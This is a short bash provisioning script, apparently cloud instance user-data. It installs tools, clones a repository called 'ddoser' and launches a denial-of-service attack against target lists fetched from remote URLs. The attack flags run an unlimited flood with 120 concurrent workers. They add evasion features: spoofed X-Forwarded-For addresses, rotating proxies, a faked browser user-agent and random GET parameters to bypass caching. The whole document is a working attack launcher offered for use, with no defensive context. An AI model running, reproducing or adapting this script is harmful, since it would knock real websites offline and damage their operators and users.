#!/bin/bash
set -x 
systemctl start amazon-ssm-agent
# Ubuntu 20 uses snap
snap start amazon-ssm-agent
# MAX_TIME=20
# MIN_TIME=13
# DIFF=$(($MAX_TIME-$MIN_TIME+1))
# R=$(($(($RANDOM%$DIFF))+$MIN_TIME))
# sudo shutdown +$R
apt update
apt install -y python3-pip python3-venv git htop
yum install -y python3-pip python3-venv git htop
ulimit -n 100000
git clone https://github.com/ifel/ddoser.git
cd ddoser/
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 ./ddoser.py \
--target-urls-file 'https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt' \
--target-urls-file 'https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt' \
--target-urls-file 'https://xn--80aafyzixh.xn--j1amh/static/targets.txt' \
--random-xff-ip \
--shuffle-proxy \
--concurrency 120 \
--count 0 \
--timeout 60 \
--user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' \
--with-random-get-param \
--restart-period 600 \
--log-to-stdout \
--stop-attack 240 \
--stop-attack-on-forbidden \
--reset-errors-on-success \
-vv
